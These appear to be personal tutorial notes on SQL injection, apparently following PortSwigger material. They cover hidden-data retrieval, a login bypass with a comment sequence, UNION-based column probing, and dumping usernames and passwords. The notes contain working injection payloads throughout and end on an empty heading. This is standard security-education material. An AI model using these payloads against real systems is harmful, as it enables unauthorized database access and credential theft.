## SQL Injection
- Sql injection is a vulnerability that allows an attacker to interfere with the queries than an application makes to its database.
- Generally allows an attacker to view data that they are not normally able to retrive or perfom queries that they are not supposed to be able to perfom.<br>
<ins>examples of sqli</ins>
- retrieving hidden data
- subverting application logic
- union attakcs
- examining the database
- blind sql injection

### Retrieving hidden data
- consider app display products in different categories....:
```http://insecure-website.com/products?category=Gifts```
- sql query made in backend was:
```select * from products where category='Gifts' and released = 1```
- this query returns<br>
* - all details<br>
from products table<br>
category = gifts<br>
release = 1<br>
- assume unreleased is 0
- we can construct a query like:
```http://insecure-website.com/products?categories=Gifts'--```
- query sent becomes:
```select * from products where category='Gifts'--' and released =1```
- **nb**note the **--** indicates comment in sql language and anything after it is ignored(interpreted as a comment)
- this effectively removes last part of query and all Gifts both released and unreleased are fetched.
- To display all products, design the query as:
```http://insecure-website.com/products?categories=Gifts'+OR+1=1--```
- resulting query becomes:
```select * from products where category='Gifts' OR 1=1--' and released=1```
- modified query will return all items where category is Gifts or 1 is equal to 1 and since 1=1 is always true, query will return all items.

### Subverting application logic
- Consider an application that lets you login with a username and password. If a user submits the name **wiener** and password **bluecheese**, the following query is perfomed:
```select * from users where username = 'wiener' and password = 'bluecheese'```
and query returns details of user if successful otherwise rejected.
- An attacker hre can login as any user without a password simply by using sql sequence **--** to remove password check in **where** clause of query e.g. use password as **administrator--** and blank password or dummy data in password to produce query:
```select * from users where username = 'administrator'--' and password = 'dd'```
- this query will login as administraotor and fetch his/her details

### Retreiving data from other database tables
- In cases where results of an sql query are returned within the application's responses, an attacker can leverage sql injection vulnerability to retrieve data from other tables within the database
- e.g. if an application executes the following query containing user input for "Gifts":
```select name,description from Products where category = 'Gifts'```
- an attacker can submit the input:
```http://insecure-website.com/products?categories=Gifts'+UNION+SELECT+username,+password+from+users--```
and resulting query will be:
```select name,description from Products where category = 'Gifts' UNION SELECT username, password from users--'```
- This will fetch all usernames and password from users table along name and description of products in gifts category

## SQL injection UNION attacks
- when an application is vulnerable to sqli and results of query returned within responses, the **union** keyword can be used to retrieve data from other tables within the database, resulting to a sqli union attack.
- keyword **union** must execute one or more additional **select** queries and append results to original query.
- To be successful, 2 key requirements are needed:
1. individual queries must return the same number of columns
2. data types in each position must be compatible between the individual queries.
- This involves figuring out the two requirements above

### Determing number of columns required in an sql injection union attack
- There are 2 methods:
#### 1. Order by
- Involves a series of order by clauses and incrementing specified column index until an error occurs .e.g.
```
'+order+by+1--
'+order+by+2--
'+order+by+3--
etc
```
- when specified column exceeds number of actual columns, database returns an error:e.g.
```The order by position number 3 is out of range of the number of items in the select list```
- alternatively, the web app may return a generic error, no results or the error in its http response
#### 2. UNION SELECT
- Involves submitting a series of **union select** payloads specifying null different values
```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL---
```
- If number of nulls doesn't match number of columns, the database returns an error e.g:
```All queries combined using a union, intersect or except operator must have an equal number of expressions in their target lists```
- alternatively, the web app may return a generic error, no results or the error in its http response
- when number of columns match, database returns an additional row in result set, containing null values in each column./
- effect on http response depends on application's code.
- alternatively, the null values may trigger a different error, e.g. NullPointerException or response may be undistinguishable from that caused by an incorrect number of nulls, making this method ineffective.
<ins>**nb**</ins>
- On **oracle** every select query musy use the **from** keyword and specify a valid table. There is an inbuilt table on oracle built for this purpose thus an injected query would look like:
```' UNION SELECT NULL FROM DUAL--```
- On mysql, the double-dash **--** sequence must be followed by a space. Alternatively, the hash character **#** can be used to identify a comment.

#### sql cheat sheet
1. https://portswigger.net/web-security/sql-injection/cheat-sheet
2. 

### Finding columns with a useful data type in an SQLi union attack
- Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.e.g.:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
- if data type isn't compatible, you get the error such as:
```conversion failed when converting the varchar value 'a' to data type int```
- if an error doesn't occur and applications response contains some additional content including injected strinf value, then the relevant column is suitable for retrieving string data.

### Using an SQLi UNION attack to retrieve interesting data
- suppose that you have identified:
```
1. original queriy return 2 columns, both of which can hold string data
2. injection point is a quoted string in the where clause
3. the database contains a table called users with the columns username and password.
```
- you can retrieve the contents of user table by submitting the input:
```' UNION SELECT username, password FROM users--```

### Examining the database in SQLi attacks
- data to be gathered while perfoming sqli include database software, contents of database(columns and tables it contains)

#### Querying database type and version
- different databases provide different ways of querying their version.e.g.
1. microsoft, mysql - select @@version
2. oracle - select  * from v$version
3. postgresql - select version()
e.g.
```' union select @@version,null,null--```

#### Listing contents of the database
- 

